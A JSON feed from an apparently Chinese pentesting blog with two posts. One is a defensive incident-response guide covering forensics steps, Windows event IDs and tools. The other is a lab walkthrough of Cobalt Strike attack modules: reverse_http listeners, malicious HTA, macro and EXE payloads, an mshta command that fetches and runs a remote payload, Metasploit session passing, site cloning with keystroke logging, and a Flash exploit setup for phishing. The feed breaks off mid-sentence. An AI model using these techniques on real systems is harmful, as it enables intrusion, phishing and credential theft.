{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"渗透测试\" category",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%9D%E8%B7%AF%E5%92%8C%E6%93%8D%E4%BD%9C/",
            "url": "https://or0kit.github.io/PenetrationTest/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%9D%E8%B7%AF%E5%92%8C%E6%93%8D%E4%BD%9C/",
            "title": "应急响应思路和操作",
            "date_published": "2022-05-18T07:39:54.000Z",
            "content_html": "<p><img data-src=\"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.png\" alt=\"应急响应\" /></p>\n<h1 id=\"思路\"><a class=\"anchor\" href=\"#思路\">#</a> 思路</h1>\n<h2 id=\"应急响应定义\"><a class=\"anchor\" href=\"#应急响应定义\">#</a> 应急响应定义</h2>\n<p>应急响应定义：组织为了应对突发 / 重大信息安全事件的发生所做的准备，以及在事件发生后所采取的措施。</p>\n<p>应急响应目标：采取紧急措施和行动，恢复业务到正常状态；调查安全事件发生的原因，避免同类事件再次发生；在需要司法机关介入时，提供法律认可的数字证据。</p>\n<h2 id=\"应急响应阶段\"><a class=\"anchor\" href=\"#应急响应阶段\">#</a> 应急响应阶段</h2>\n<p>从<strong>业务流程方式</strong>可以分为六个阶段：</p>\n<ol>\n<li><strong>准备</strong>：让我们严正以待，即在事件未发生时的准备工作，包括策略、计划、规范文档及具体的技术工具和平台，未雨绸膜</li>\n<li><strong>评估</strong>：对情况综合评估，初步判断是什么类型的问题，受影响的系统及严重程度</li>\n<li><strong>遏制</strong>：制止事态的扩大，限制攻击、破坏所波及的范围</li>\n<li><strong>根除</strong>：对事件发生的原因进行分析，彻底解决问题，避免再次在同一个问题上犯错</li>\n<li><strong>恢复</strong>：系统恢复常态</li>\n<li><strong>跟踪</strong>：针对事件的整改措施进行落实并监控是否有无异常，换句话叫安全运营中的持续改进，时刻保持危机感。</li>\n</ol>\n<h2 id=\"应急响应思路流程\"><a class=\"anchor\" href=\"#应急响应思路流程\">#</a> 应急响应思路流程</h2>\n<h3 id=\"收集信息\"><a class=\"anchor\" href=\"#收集信息\">#</a> 收集信息</h3>\n<p>在赶往出事地点的路上以及还没有接触到具体业务时，要提前向客户询问清楚事件情况，如发现时间以及大致发生时间、事件造成的破坏、受害主机情况 (如系统、版本、内外网)、客户的具体处置要求</p>\n<h3 id=\"事件预定性\"><a class=\"anchor\" href=\"#事件预定性\">#</a> 事件预定性</h3>\n<p>在初步了解情况后先做一个<strong>事件性质预判</strong>，判断下这个事件是个什么事件，是勒索还是挖矿还是其他事件。然后根据事件发生时间划定一个<strong>时间范围</strong>，重点排查这个时间段内的情况，从影响范围中确认一个<strong>排查范围</strong>。</p>\n<p><img data-src=\"2.png\" alt=\"2\" /></p>\n<h3 id=\"取证分析\"><a class=\"anchor\" href=\"#取证分析\">#</a> 取证分析</h3>\n<p>通过事件的初步定性取证，并且有选择的优先分析重点内容。</p>\n<p><img data-src=\"3.png\" alt=\"3\" /></p>\n<h3 id=\"取证注意事项\"><a class=\"anchor\" href=\"#取证注意事项\">#</a> 取证注意事项</h3>\n<p><strong>保护</strong></p>\n<blockquote>\n<p>保证数据的安全性：制作磁盘映像 —— 不在原始磁盘上操作<br />\n保证数据完整性：取证中不使用可能破坏完整性的操作<br />\n第三方监督：所有操作都有第三方在场监督</p>\n</blockquote>\n<p><strong>提取</strong></p>\n<blockquote>\n<p>优先提取易消失的证据：内存信息、系统进程、网络连接信息、路由信息、临时文件、缓存等<br />\n文件系统：数据恢复、隐藏文件、加密文件、回收站、注册表、系统日志等<br />\n应用系统：系统日志、中间件日志</p>\n</blockquote>\n<p><strong>分析</strong></p>\n<blockquote>\n<p>证据在什么地方：日志、删除的文件、临时文件、缓存<br />\n从证据中能发现什么？如何关联证据？</p>\n</blockquote>\n<h3 id=\"定向分析\"><a class=\"anchor\" href=\"#定向分析\">#</a> 定向分析</h3>\n<p>二次定性后，我们基本已经真正掌握了事件情况，这时就可以进行各种分析，对各种情况利用各种工具快速</p>\n<p><img data-src=\"4.png\" alt=\"4\" /></p>\n<p><img data-src=\"5.png\" alt=\"5\" /></p>\n<p><img data-src=\"6.png\" alt=\"6\" /></p>\n<p><img data-src=\"7.png\" alt=\"7\" /></p>\n<p><img data-src=\"8.png\" alt=\"8\" /></p>\n<p><img data-src=\"9.png\" alt=\"9\" /></p>\n<h1 id=\"实施思路\"><a class=\"anchor\" href=\"#实施思路\">#</a> 实施思路</h1>\n<p>大致可以分为五个部分：</p>\n<p><img data-src=\"%E5%A4%84%E7%BD%AE%E6%AD%A5%E9%AA%A4.png\" alt=\"处置步骤\" /></p>\n<ol>\n<li>\n<p>收集信息：收集客户信息和受害主机信息，如有病毒样本也收集</p>\n</li>\n<li>\n<p>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等。</p>\n</li>\n<li>\n<p>深入分析：日志分析、进程分析、启动项分析、样本分析。</p>\n</li>\n<li>\n<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</p>\n</li>\n<li>\n<p>产出报告：整理并输出完整的安全事件报告。</p>\n</li>\n</ol>\n<h2 id=\"收集信息-2\"><a class=\"anchor\" href=\"#收集信息-2\">#</a> 收集信息</h2>\n<h3 id=\"受害情况\"><a class=\"anchor\" href=\"#受害情况\">#</a> 受害情况</h3>\n<h4 id=\"客户主机情况\"><a class=\"anchor\" href=\"#客户主机情况\">#</a> 客户主机情况</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">客户名称</th>\n<th style=\"text-align:left\">什么区域的什么客户</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">感染主机数</td>\n<td style=\"text-align:left\">感染了多数台主机</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">补丁情况</td>\n<td style=\"text-align:left\">打了哪些补丁，是否存在补丁漏打</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">中毒现象</td>\n<td style=\"text-align:left\">勒索 / 挖矿 / DoS / 僵尸网络 / 后门 / 木马</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">帐号密码</td>\n<td style=\"text-align:left\">确认是否有弱密码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">对外开发端口</td>\n<td style=\"text-align:left\">对外开发了哪些端口</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">开启的服务</td>\n<td style=\"text-align:left\">开启了哪些服务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">操作系统版本</td>\n<td style=\"text-align:left\">操作系统版本信息</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">客户需求</td>\n<td style=\"text-align:left\">确认客户具体需求</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p><img data-src=\"1.png\" alt=\"1\" /></p>\n<h2 id=\"取证\"><a class=\"anchor\" href=\"#取证\">#</a> 取证</h2>\n<p>取证并非毫无头绪的，病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的 dll/so 模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。</p>\n<p>可以归结为如下 4 点要素：<strong>流量、内存、模块、启动项。</strong></p>\n<p>流量分析可以使用 Wireshark，主要分析下当前主机访问了哪些域名、URL、服务，或者有哪些外网 IP 在访问本地主机的哪些端口、服务和目录，又使用了何种协议等等。</p>\n<h3 id=\"可疑域名\"><a class=\"anchor\" href=\"#可疑域名\">#</a> 可疑域名</h3>\n<p>如 asd333.2111.pw 这样的域名很明显是一个动态域名，极大可能就是一个恶意域名，有可能是 C2 服务器，</p>\n<h3 id=\"网络协议分析\"><a class=\"anchor\" href=\"#网络协议分析\">#</a> 网络协议分析</h3>\n<p>IRC 协议在日常中很少使用，但常被用来建立僵尸网络，所以可以过滤筛选 IRC</p>\n<h3 id=\"外连\"><a class=\"anchor\" href=\"#外连\">#</a> 外连</h3>\n<p>外连可以使用 TcpView 或者命令行下 netstat 命令排查</p>\n<p><img data-src=\"10.png\" alt=\"10\" /></p>\n<p>重点关注如下的外连和状态为 ESTABLISHED 的连接</p>\n<pre><code>chenyu-57068a53.localdomain.2674-&gt; amsterdam.nl.eu.undernet.org.6667\nTCP    127.0.0.1:8588         127.0.0.1:49856        ESTABLISHED     5004\n</code></pre>\n<h1 id=\"实施具体操作\"><a class=\"anchor\" href=\"#实施具体操作\">#</a> 实施具体操作</h1>\n<p>在简单做完定向分析并取证后，如果客户直接把系统重置了就不需要下一步了，如果客户要求从头到尾把系统排查一下那么就利用工具和手法进行排查。</p>\n<p>对账户、进程、端口、服务、启动项、计划任务、文件、日志进行逐个检测，</p>\n<h2 id=\"日志\"><a class=\"anchor\" href=\"#日志\">#</a> 日志</h2>\n<p>在取证那一步就做的工作，由于日志是最容易被删除或覆盖，所以一上去就要优先保存日志。</p>\n<p>windows 下可疑打开事件管理器或者使用 EventLogExplorer、Logparse 等工具。</p>\n<p>重要的事件日志 ID 如下：</p>\n<table>\n<thead>\n<tr>\n<th>Event ID(2000/XP/2003)</th>\n<th>Event ID(Vista/7/8/2008/2012)</th>\n<th>描述</th>\n<th>日志名称</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>528</td>\n<td>4624</td>\n<td>成功登录</td>\n<td>Security</td>\n</tr>\n<tr>\n<td>529</td>\n<td>4625</td>\n<td>失败登录</td>\n<td>Security</td>\n</tr>\n<tr>\n<td>680</td>\n<td>4776</td>\n<td>成功 / 失败的账户认证</td>\n<td>Security</td>\n</tr>\n<tr>\n<td>624</td>\n<td>4720</td>\n<td>创建用户</td>\n<td>Security</td>\n</tr>\n<tr>\n<td>636</td>\n<td>4732</td>\n<td>添加用户到启用安全性的本地组中</td>\n<td>Security</td>\n</tr>\n<tr>\n<td>632</td>\n<td>4728</td>\n<td>添加用户到启用安全性的全局组中</td>\n<td>Security</td>\n</tr>\n<tr>\n<td>2934</td>\n<td>7030</td>\n<td>服务创建错误</td>\n<td>System</td>\n</tr>\n<tr>\n<td>2944</td>\n<td>7040</td>\n<td>IPSEC 服务服务的启动类型已从禁用更改为自动启动</td>\n<td>System</td>\n</tr>\n<tr>\n<td>2949</td>\n<td>7045</td>\n<td>服务创建</td>\n<td>System</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"账户\"><a class=\"anchor\" href=\"#账户\">#</a> 账户</h2>\n<p>PChunter、D 盾</p>\n<p><img data-src=\"%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B711-16494047086361.png\" alt=\"隐藏账户11\" /></p>\n<h2 id=\"端口\"><a class=\"anchor\" href=\"#端口\">#</a> 端口</h2>\n<p>注意以下状态的网络连接：<strong>ESTABLISHED：连接建立数据传输</strong>。<strong>LISTEN：监听中等待连接</strong></p>\n<p>Tcpview、火绒剑、命令行下 netstat -ano：</p>\n<p><img data-src=\"%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A51.png\" alt=\"网络连接1\" /></p>\n<p>DNSQuerySniffer：DNS 解析查询工具。可以通过此工具确定访问恶意域名的端口号，该工具还可以将主机访问过的所有域名记录下来。</p>\n<p><img data-src=\"%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A52DNS%E8%AE%B0%E5%BD%95.png\" alt=\"网络连接2DNS记录\" /></p>\n<h2 id=\"进程\"><a class=\"anchor\" href=\"#进程\">#</a> 进程</h2>\n<p>主要注意点大致就是：<strong>没有厂商名字</strong>、没有<strong>签名验证信息</strong>、没有<strong>描述信息</strong>的可疑进程。还有典型的挖矿现象 (CPU 或内存资源占用长时间过高) 的进程。</p>\n<p>Pchunter：黑色为微软官方进程，蓝色为外界安装软件进程，红色为可疑进程，同时注意进程参数。</p>\n<p><img data-src=\"PChunter1.png\" alt=\"\" /></p>\n<p>Process Explorer，进程浏览器。界面功能从左到右为：Process 进程、CPU 占比、Private Bytes 提交大小、Working Set (工作设置、内存)、PID、Description 描述、Company Name 公司名。</p>\n<p>小技巧：被注入的进程属性里会多出 **.NET Assemblies<strong> 和</strong>.NET Performance** 两个菜单</p>\n<p><img data-src=\"ProEXP%E8%BF%9B%E7%A8%8B.png\" alt=\"\" /></p>\n<h2 id=\"启动项-计划任务-服务\"><a class=\"anchor\" href=\"#启动项-计划任务-服务\">#</a> 启动项、计划任务、服务</h2>\n<p>autoruns: 检查启动项、计划任务、服务最推荐的工具。autoruns 可以看到启动项的可执行文件路径和启动命令。</p>\n<p><img data-src=\"autoruns1.png\" alt=\"\" /></p>\n<p><img data-src=\"autoruns1%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.png\" alt=\"\" /></p>\n<p><img data-src=\"autoruns2DLL.png\" alt=\"\" /></p>\n<p><img data-src=\"autoruns3%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8.png\" alt=\"\" /></p>\n<p>WMI 后门：无文件，相对来说难以排查，但也可以使用 autoruns 排查。</p>\n<p><img data-src=\"autoruns4WMI%E6%8E%92%E6%9F%A5.png\" alt=\"\" /></p>\n<h2 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h2>\n<h3 id=\"程序运行记录\"><a class=\"anchor\" href=\"#程序运行记录\">#</a> 程序运行记录</h3>\n<p>使用 WinPrefetchView 解析 Prefetch 文件夹中的.pf 文件取证。</p>\n<p><img data-src=\"%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B19.png\" alt=\"\" /></p>\n<h3 id=\"可疑文件\"><a class=\"anchor\" href=\"#可疑文件\">#</a> 可疑文件</h3>\n<p>可疑文件的排查可疑根据预判时确定的<strong>时间范围和影响范围</strong>来缩小排查范围。</p>\n<p>筛选要排查的时间范围内的文件，尤其是创建时间、修改时间在此时间范围内的文件以及临时文件、快捷方式</p>\n<h2 id=\"rootkit病毒查杀\"><a class=\"anchor\" href=\"#rootkit病毒查杀\">#</a> Rootkit 病毒查杀</h2>\n<p>火绒恶性木马专杀工具 hrkill, 单独下载运行。</p>\n<p>官网：<span class=\"exturl\" data-url=\"aHR0cDovL2Jicy5odW9yb25nLmNuL3RocmVhZC0xODU3NS0xLTEuaHRtbA==\">http://bbs.huorong.cn/thread-18575-1-1.html</span></p>\n<p>或腾讯管家工具箱内下载 &quot;系统急救箱&quot; 运行扫描，过程中点击会重启两三次。</p>\n<p>也可以选择 360 顽固病毒查杀。</p>\n<h2 id=\"清理与加固\"><a class=\"anchor\" href=\"#清理与加固\">#</a> 清理与加固</h2>\n<p>漏洞和补丁，在应急响应中是不可或缺。如果黑客是通过某种漏洞入侵系统的，而在应急响应中，无法找出黑客所利用的漏洞，就会意味着，入侵行为可以反复发生。在终端侧，就会表现为病毒清理不干净，杀了又来，所以一定要找出漏洞。</p>\n<p>找到漏洞后，就需要打上相应的补丁，这样才是一次完整的处置。</p>\n<p>怎么查看系统补丁情况？以 Windows 为例，直接打开 cmd，输入命令 systeminfo 即可获取。</p>\n",
            "tags": [
                "应急响应"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "url": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "title": "CobaltStrike攻击模块的使用",
            "date_published": "2021-07-07T06:27:57.000Z",
            "content_html": "<h1 id=\"attacks模块简介\"><a class=\"anchor\" href=\"#attacks模块简介\">#</a> Attacks 模块简介</h1>\n<h2 id=\"packages模块\"><a class=\"anchor\" href=\"#packages模块\">#</a> packages 模块</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<blockquote>\n<p>HTML Application:<br />\n 生成一个恶意 HTML Application 木马，后缀格式为 .hta。通过 HTML 调用其他语言的应用组件进行攻击，提供了可执行文件、PowerShell、VBA 三种方法</p>\n</blockquote>\n<blockquote>\n<p>MS Office Macro:<br />\n 生成 office 宏病毒文件；</p>\n</blockquote>\n<blockquote>\n<p>Payload Generator:<br />\n 生成各种语言版本的 payload，可以生成基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等的 payload</p>\n</blockquote>\n<blockquote>\n<p>Windows Executable:<br />\n 生成 32 位或 64 位的 exe 和基于服务的 exe、DLL 等后门程序</p>\n</blockquote>\n<blockquote>\n<p>Windows Executable(S)<br />\n 用于生成一个 exe 可执行文件，其中包含 Beacon 的完整 payload，不需要阶段性的请求。<br />\n与 Windows Executable 模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持 powershell 脚本，可用于将 Stageless Payload 注入内存。</p>\n</blockquote>\n<h2 id=\"web-drive-by-网站钓鱼攻击\"><a class=\"anchor\" href=\"#web-drive-by-网站钓鱼攻击\">#</a> Web Drive-by 网站钓鱼攻击</h2>\n<p>点击中间的 Attacks——&gt; Web Drive-by（网站钓鱼攻击）</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>Manage　　　　　　　　　　 对开启的 web 服务进行管理；<br />\nClone Site 　　 　　　　　克隆网站，可以记录受害者提交的数据；<br />\nHost File 　　　　　　　　提供一个文件下载，可以修改 Mime 信息；Host File 可以配合 DNS 欺骗实现挂马效果使用<br />\n Scripted Web Delivery    基于 Web 的攻击测试脚本，自动生成可执行的 payload ;<br />\nSigned Applet Attack 　　启动一个 Web 服务以提供自签名 Java Applet 的运行环境；<br />\nSmart Applet Attack 　　 自动检测 Java 版本并 l 利用已知的 exploits 绕过 security；<br />\nSystem Profiler　　　　　用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等。<br />\nSpear Phish 　　　　　　　用来邮件钓鱼的模块</p>\n<h1 id=\"cobaltstrike-attacks模块的利用方法\"><a class=\"anchor\" href=\"#cobaltstrike-attacks模块的利用方法\">#</a> CobaltStrike Attacks 模块的利用方法</h1>\n<h2 id=\"msf与cobaltstrike结合获取meterpreter\"><a class=\"anchor\" href=\"#msf与cobaltstrike结合获取meterpreter\">#</a> MSF 与 CobaltStrike 结合获取 meterpreter</h2>\n<p>在 CobaltStrike 中的 Listenter 中有一些 Foreign 的载荷（payload），常用于于 MSF 结合</p>\n<p>创建 Beacon Listener</p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 Foregin (windows/foregin/reverse_http) -&gt;  msf 攻击机 ip/msf 监听端口 (192.168.199.145:4444)</p>\n</blockquote>\n<p>在攻击机上进行 msf 监听</p>\n<blockquote>\n<p>use exploit/multi/handler<br />\nset payload windows/meterpreter/reverse_http<br />\nset lhost 192.168.199.145<br />\nset lport 4444<br />\nrun/exploit</p>\n</blockquote>\n<p>生成攻击文件在目标机器运行既可</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h2 id=\"利用web服务远程加载文件获取beacon\"><a class=\"anchor\" href=\"#利用web服务远程加载文件获取beacon\">#</a> 利用 web 服务，远程加载文件，获取 beacon</h2>\n<p>利用 <code>Attack -&gt;  packeg</code>  中的 <code>HTML Application</code></p>\n<p>一个 <code>HTML Application</code> （HTML 应用）是一个使用 HTML 和一个 Internet 浏览器支持的脚本语言编写的 Windows 程序。该程序包生成一个 HTML 应用，该应用运行一个 <code>Cobalt Strike payload</code> 。你可以选择一个 HTML 应用，此 HTML 应用使得一个可执行文件落地在磁盘上并运行它。选择 <code>powershell</code>  选项来得到一个 HTML 应用，该应用应该使用 <code>Powershell</code>  来运行一个 <code>payload</code></p>\n<p>新建一个 <code>Linsenter</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>创建一个.hta 的恶意文件</p>\n<blockquote>\n<p>Attacks -&gt;  Package -&gt;  HTML Application -&gt;  选择 Listener -&gt;  method 选择 powershell -&gt;  Generate</p>\n</blockquote>\n<p>加载本地文件到服务端，进行 web 服务</p>\n<blockquote>\n<p>Attacks -&gt;  Web Drive-by -&gt;  Host File -&gt;  File 选择本地生成的.hta 文件</p>\n</blockquote>\n<p>目标机 cmd.exe 中运行以下命令（白名单文件 mshta.exe 无免杀，在加载.hta 文件时可被多种杀软查杀)(mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件，或在批处理中结合其他语言的代码；如：mshta javascript，可用于运行一个 HTML 网页而不会出现安全警告。)</p>\n<blockquote>\n<p>mshta <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1pcCstMHkzZTE4OW8vZG93bmxvYWQvZmlsZS5leHQ=\">http://ip + 端口 /download/file.ext</span></p>\n</blockquote>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>靶机上线。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"ms-office-macro-宏获取beacon\"><a class=\"anchor\" href=\"#ms-office-macro-宏获取beacon\">#</a> MS Office Macro 宏获取 beacon</h2>\n<p>利用 Attack -&gt;  Package -&gt;  MS office Macro</p>\n<p><code>MS office Macro</code>  模块提供一个 <code>Microsoft Office</code>  的宏文件，并提供嵌入 <code>Microsoft World</code>  或 <code>Microsoft Excel</code>  的说明</p>\n<p>新建一个 <code>Linsenter</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>利用 <code>MS Office Macro</code>  模块获取宏</p>\n<blockquote>\n<p>Attack -&gt;  Package -&gt;  MS office Macr</p>\n</blockquote>\n<p>将获取的宏嵌入到文档当中</p>\n<blockquote>\n<p>Microsoft World 文档 -&gt;  视图 -&gt;  宏 -&gt;  宏名任意 -&gt;  创建 -&gt;  Microsoft Visual Basic for Application 控制台 -&gt;  将生成的宏复制到代码区 -&gt; 保存</p>\n</blockquote>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>靶机上线。</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"制作钓鱼网址盗取用户输入信息\"><a class=\"anchor\" href=\"#制作钓鱼网址盗取用户输入信息\">#</a> 制作钓鱼网址盗取用户输入信息</h2>\n<p>利用 Attack -&gt;  Web Drive-by -&gt; Clone Site 制作钓鱼网址</p>\n<p>在向目标发送漏洞利用程序之前，进行伪装会有所帮助。 <code>Cobalt Strike</code>  的网站克隆工具可以帮助此目标。网站克隆工具制作一个网站的本地的复制，使用一些增加的代码来修复连接和图像这样它们可以如预期一样工作。</p>\n<p>建立 <code>Linstener</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>利用 <code>Clone Site</code>  获取钓鱼网址</p>\n<blockquote>\n<p>Attack -&gt;  Web Drive-by -&gt; Clone Site -&gt;  Clone Url (被克隆网址) -&gt;  勾选 Log Keystroken on Cloned site</p>\n</blockquote>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>利用网站日志（web Log）查看被钓鱼方输入的信息</p>\n<blockquote>\n<p>View -&gt;  Web Log</p>\n</blockquote>\n<p>如下为被克隆网站</p>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"简单exe等可执行文件上线目标主机\"><a class=\"anchor\" href=\"#简单exe等可执行文件上线目标主机\">#</a> 简单 EXE 等可执行文件上线目标主机</h2>\n<p>利用 Attack -&gt;  Packages -&gt;  Windows Executable/(s)</p>\n<p>该程序包含一个 Windows 可执行 <code>Artifact</code> ，用于传送一个 <code>Payload Stager</code> 。这个程序包为使用者提供了多种输出选项。 <code>Windows Service EXE</code>  是一个 Windows 可执行文件，可响应 <code>Service Control Manager</code>  命令。使用者可以使用这个可执行文件来作为使用 <code>SC</code>  命令行的 Windows 服务的调用程序，或使用 <code>Metasploit</code>  框架的 <code>PsExec</code>  模块生成一个自定义的可执行文件。<br />\n普通的 EXE 和服务器启动调用的 EXE 是由区别的，利用 <code>Windows Service EXE</code>  生成的 EXE 才能用来作为服务自启动的 EXE，利用 <code>Cobalt Strike</code>  中 Windows EXE 生成的 EXE 不能作为服务自启动的 EXE 程序。</p>\n<p>创建一个监听</p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>生成可执行程序</p>\n<blockquote>\n<p>Attack -&gt;  Packages -&gt; windows Executable/(s)</p>\n</blockquote>\n<p>目标机器运行可执行文件，上线目标主机</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>生成 Powershell 版的需要在目标主机的 Powershell 控制台运行该 ps1 脚本<br />\n生成 dll 文件，需要在目标主机加载</p>\n<h2 id=\"利用msf结合cobalt-strike获取cs-beacon\"><a class=\"anchor\" href=\"#利用msf结合cobalt-strike获取cs-beacon\">#</a> 利用 MSF 结合 Cobalt Strike 获取 CS beacon</h2>\n<p>在 0x01 部分，我们知道 Cobalt Strike 可以与 MSF 配合获取 meterpreter，当然，二者也可以相互配合获取 Beacon。</p>\n<p>你可以使用 MSF 中的 <code>exploit/windows/local/payload_inject</code>  模块将 MSF 获取的 <code>meterpreter</code>  传送给 <code>Cobalt Strike</code></p>\n<p>Cobalt Strike 新建一个 <code>Listener</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>MSF 获取目标 <code>meterpreter</code> <br />\n 将 <code>meterpreter</code>  利用 <code>exploit/windows/local/payload_inject</code>  模块传送给 CS</p>\n<blockquote>\n<p>background<br />\nuse exploit/windows/local/payload_inject</p>\n</blockquote>\n<p>设定 CS 的 ip 和监听端口</p>\n<blockquote>\n<p>set LHOST CSip<br />\nset LPORT CS Listener 监听端口<br />\n set disablepayloadhandler true</p>\n</blockquote>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>设定传送的 <code>session</code></p>\n<blockquote>\n<p>set session id</p>\n</blockquote>\n<p>session id 可输入 <code>sessions</code>  查看</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<p>运行即可</p>\n<p><img data-src=\"image013.png\" alt=\"\" /></p>\n<h2 id=\"payload-generatorpayload-生成器\"><a class=\"anchor\" href=\"#payload-generatorpayload-生成器\">#</a> Payload Generator (Payload 生成器)</h2>\n<p>该模块可以生成 n 中语言的后门 Payload，包括 C,C#,Python,Java,Perl,Powershell 脚本，Powershell 命令，Ruby,Raw，免杀框架 Veli 中的 shellcode 等等... 这是 CS 的一个很大的迷人之处。</p>\n<blockquote>\n<p>attack -&gt;  Packages -&gt;  payload Generator</p>\n</blockquote>\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<h2 id=\"cs发送钓鱼邮件\"><a class=\"anchor\" href=\"#cs发送钓鱼邮件\">#</a> CS 发送钓鱼邮件</h2>\n<p>CS 能生成 Office 宏，发现生成的该文件很容易被杀软监测出来，并处理掉，加上它的局限性，在外网实际中意义不大，在内网用效果可能还好。主要是思路。</p>\n<p>实验环境</p>\n<p>虚拟机搭建的邮件服务器地址：192.168.199.133</p>\n<p>Cobalt strike 服务器地址：192.168.199.145</p>\n<p>Kali 虚拟机地址：192.168.199.145</p>\n<p>这里我们应用到一个 flash 插件漏洞的 payloads： <code>adobe_flash_hacking_team_uaf</code></p>\n<p>通过 Cobalt Strike 结合 metasploit 进行实验，如下：</p>\n<p>通过 kali 启用 metasploit。</p>\n<p>配置：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/multi/browser/adobe_flash_hacking_team_uaf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_http</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.199.145</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> disablepayloadhandler <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> prependmigrate <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src=\"image021.png\" alt=\"\" /></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p>执行后如图所示，会得到一个利用地址，记录该地址：</p>\n<p>这里使用</p>\n<p><code>Local IP: http://192.168.199.145:8080/I2bDeFpXx21H</code></p>\n<p>接下来为了方便钓鱼邮件的内容伪造的真实，我们通过 cobalt strike 克隆一个网站。</p>\n<p>进入 Web-Drive-by 选项选择 Clone Site。</p>\n<p>这里提醒下，如果在克隆模块克隆的是 HTTPS 的页面，需要在攻击方加载 SSL 哦，不然没法记录或者执行！(踩坑)</p>\n<p>其中 attack 就是我们 metasploit 中生成的地址链接</p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<p>克隆成功</p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<p>克隆出来的百度</p>\n<p><img data-src=\"image025.png\" alt=\"\" /></p>\n<p>记录的键盘操作</p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<p>克隆出来的百度网页源代码</p>\n<p><img data-src=\"image027.png\" alt=\"\" /></p>\n<p>利用 flash 